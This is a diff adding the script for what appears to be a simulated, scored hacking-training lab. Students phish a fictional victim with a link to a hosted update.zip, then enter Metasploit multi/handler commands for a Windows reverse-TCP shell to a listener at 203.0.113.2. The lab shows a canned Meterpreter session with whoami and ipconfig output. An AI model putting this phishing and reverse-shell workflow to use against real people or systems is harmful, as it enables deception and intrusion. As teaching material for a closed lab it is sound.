+  help.textContent = ok ? 'Correct recipient — this is Will Smith, our victim.' : 'This should be the victim\'s address: wsmith@mail.netlab.local';
+  help.className = 'helptext ' + (ok ? 'ok' : 'err');
+  document.getElementById('mailTo').classList.toggle('field-ok', ok);
+  document.getElementById('mailTo').classList.toggle('field-err', !ok && v.length>0);
+  updateSendState();
+}
+
+function checkSubject(){
+  const v = document.getElementById('mailSubject').value.trim();
+  const help = document.getElementById('subjHelp');
+  const ok = v.length >= 4;
+  mailState.subjOk = ok;
+  help.textContent = ok ? 'Believable enough to get an open.' : 'Give it a subject that would make someone click.';
+  help.className = 'helptext ' + (ok ? 'ok' : 'err');
+  document.getElementById('mailSubject').classList.toggle('field-ok', ok);
+  updateSendState();
+}
+
+function openLinkModal(){ document.getElementById('linkModal').style.display = 'block'; }
+function closeLinkModal(){ document.getElementById('linkModal').style.display = 'none'; }
+
+function confirmLink(){
+  const url = document.getElementById('linkUrl').value.trim();
+  const status = document.getElementById('linkStatus');
+  if(url.toLowerCase().includes('update.zip')){
+    mailState.linkOk = true;
+    status.innerHTML = '<span class="linkpill">🔗 HERE → ' + url + '</span>';
+    closeLinkModal();
+  } else {
+    document.getElementById('linkUrl').classList.add('field-err');
+    status.innerHTML = '<div class="helptext err">The link should point at the update.zip you hosted in Task 1, e.g. http://203.0.113.2:8000/update.zip</div>';
+  }
+  updateSendState();
+}
+
+function updateSendState(){
+  const ready = mailState.toOk && mailState.subjOk && mailState.linkOk;
+  document.getElementById('sendBtn').disabled = !ready;
+  // award points incrementally: login(1) + to(1) + subject(1) + link(1) already counted below on send for final pt
+  let pts = 1; // login already happened to reach this screen
+  if(mailState.toOk) pts++;
+  if(mailState.subjOk) pts++;
+  if(mailState.linkOk) pts++;
+  state.t2 = Math.min(4, pts); // reserve 5th point for actually sending
+  refreshScore();
+}
+
+function sendMail(){
+  state.t2 = 5;
+  refreshScore();
+  document.getElementById('sendHelp').textContent = 'Message sent to wsmith@mail.netlab.local. Will Smith has an unread email waiting on WinOS.';
+  document.getElementById('sendHelp').className = 'helptext ok';
+  document.getElementById('sendBtn').disabled = true;
+}
+
+/* initial t2 point for reaching compose is granted on login */
+const _origCheckLogin = checkLogin;
+checkLogin = function(){
+  const before = mailState.loggedIn;
+  _origCheckLogin();
+  if(!before && document.getElementById('mail-compose-block').style.display === 'block'){
+    mailState.loggedIn = true;
+    state.t2 = 1;
+    refreshScore();
+  }
+};
+
+/* ================= TASK 3 : msfconsole + victim ================= */
+const t3Body = document.getElementById('t3-body');
+const t3Input = document.getElementById('t3-input');
+const t3Prompt = document.getElementById('t3-prompt');
+let t3Idx = 0;
+let handlerReady = false;
+
+const t3Steps = [
+  { match:c => c === 'use exploit/multi/handler', out:['[*] Using configured payload generic/shell_reverse_tcp'], hint:'Type: use exploit/multi/handler', prompt:'msf6 exploit(multi/handler) >' },
+  { match:c => c.includes('set payload') && c.includes('windows/x64/shell_reverse_tcp'), out:['payload => windows/x64/shell_reverse_tcp'], hint:'Type: set payload windows/x64/shell_reverse_tcp' },
+  { match:c => c.includes('set lhost') && c.includes('203.0.113.2'), out:['lhost => 203.0.113.2'], hint:'Type: set LHOST 203.0.113.2' },
+  { match:c => c === 'exploit' || c === 'run', out:['[*] Started reverse TCP handler on 203.0.113.2:4444','[*] Waiting for a connection...'], hint:'Type: exploit', final:true }
+];
+
+function t3Print(text, cls){
+  const div = document.createElement('div');
+  div.className = 'term-line ' + (cls||'out');
+  div.textContent = text;
+  t3Body.appendChild(div);
+  t3Body.scrollTop = t3Body.scrollHeight;
+}
+function t3PrintCmd(text){
+  const div = document.createElement('div');
+  div.className = 'term-line cmd';
+  div.innerHTML = '<span class="prompt">' + t3Prompt.textContent + '</span> ' + text;
+  t3Body.appendChild(div);
+  t3Body.scrollTop = t3Body.scrollHeight;
+}
+
+t3Print('msfconsole loaded. Configure and start a multi/handler to catch the callback from update.exe.', 'out');
+
+t3Input.addEventListener('keydown', (e) => {
+  if(e.key !== 'Enter') return;
+  const raw = t3Input.value;
+  const cmd = normalize(raw);
+  if(!cmd) return;
+  t3PrintCmd(raw);
+
+  const step = t3Steps[t3Idx];
+  if(!step){ t3Print('(handler already running)', 'out'); t3Input.value=''; return; }
+
+  if(step.match(cmd)){
+    step.out.forEach(l => t3Print(l, 'out'));
+    t3Print('✔ Step complete.', 'ok');
+    markT3Step(t3Idx, true);
+    if(step.prompt) t3Prompt.textContent = step.prompt;
+    if(step.final){
+      handlerReady = true;
+      t3Prompt.textContent = 'msf6 exploit(multi/handler) >';
+      enableVictimFlow();
+    }
+    t3Idx++;
+  } else {
+    t3Print('unknown command / bad state — try again.', 'err');
+    t3Print('Hint: ' + step.hint, 'hint');
+  }
+  t3Input.value = '';
+});
+
+function markT3Step(i, done){
+  const li = document.querySelector('#t3-checklist li[data-step="'+i+'"]');
+  if(li) li.classList.toggle('done', done);
+  if(done) state.t3 = Math.min(4, state.t3 + 1); // 4 pts from handler, 1 reserved for victim exec
+  refreshScore();
+}
+
+function enableVictimFlow(){
+  document.querySelectorAll('#vsteps .vstep button')[0].disabled = false;
+}
+
+let vProgress = -1;
+function vStep(i){
+  if(i !== vProgress + 1) return;
+  const el = document.querySelector('.vstep[data-v="'+i+'"]');
+  if(i === 4){
+    document.getElementById('zipPassRow').style.display = 'block';
+    return;
+  }
+  completeVStep(i, el);
+}
+
+function completeVStep(i, el){
+  el.classList.add('done');
+  el.querySelector('button').disabled = true;
+  vProgress = i;
+  const next = document.querySelector('.vstep[data-v="'+(i+1)+'"]');
+  if(next) next.querySelector('button').disabled = false;
+  if(i === 5){
+    victimRunsExe();
+  }
+}
+
+function checkZipPass(){
+  const v = document.getElementById('zipPassInput').value.trim();
+  const help = document.getElementById('zipHelp');
+  const expected = window.LAB_ZIP_PASSWORD || 'xyzsecurity';
+  if(v === expected){
+    help.textContent = 'Correct — archive unlocked.';
+    help.className = 'helptext ok';
+    const el = document.querySelector('.vstep[data-v="4"]');
+    completeVStep(4, el);
+    document.getElementById('zipPassRow').style.display = 'none';
+  } else {
+    help.textContent = 'That doesn\'t match the password you set on update.zip in Task 1.';
+    help.className = 'helptext err';
+  }
+}
+
+function victimRunsExe(){
+  state.t3 = 5;
+  refreshScore();
+  t3Print('', 'out');
+  t3Print('[*] Sending stage (200262 bytes) to 192.168.0.50', 'ok');
+  t3Print('[*] Meterpreter session 1 opened (203.0.113.2:4444 -> 192.168.0.50:51102)', 'ok');
+  t3Print('', 'out');
+  t3Print('C:\\Windows\\system32> whoami', 'out');
+  t3Print('netlab\\lab-user', 'ok');
+  t3Print('C:\\Windows\\system32> ipconfig', 'out');
+  t3Print('Ethernet adapter Ethernet0:', 'out');
+  t3Print('   IPv4 Address. . . . . . . . . . . : 192.168.0.50', 'ok');
+  t3Print('   Default Gateway . . . . . . . . . : 192.168.0.1', 'out');
+  t3Print('C:\\Windows\\system32> hostname', 'out');
+  t3Print('WinOS', 'ok');
+  t3Print('', 'out');
+  t3Print('Control gained — connected to the hidden intranet machine behind the firewall. Task 3 complete.', 'ok');
+}
+
+/* ================= Completion ================= */
+function renderCert(){
+  const name = document.getElementById('studentName').value.trim();
+  document.getElementById('certName').textContent = name || '—';
+  if(state.completedAt){
+    document.getElementById('certDate').textContent = state.completedAt.toLocaleString();
+  }
+  document.getElementById('certScore').textContent = totalScore() + ' / 15';
+}
+
+refreshScore();
+</script>
+</body>
+</html>
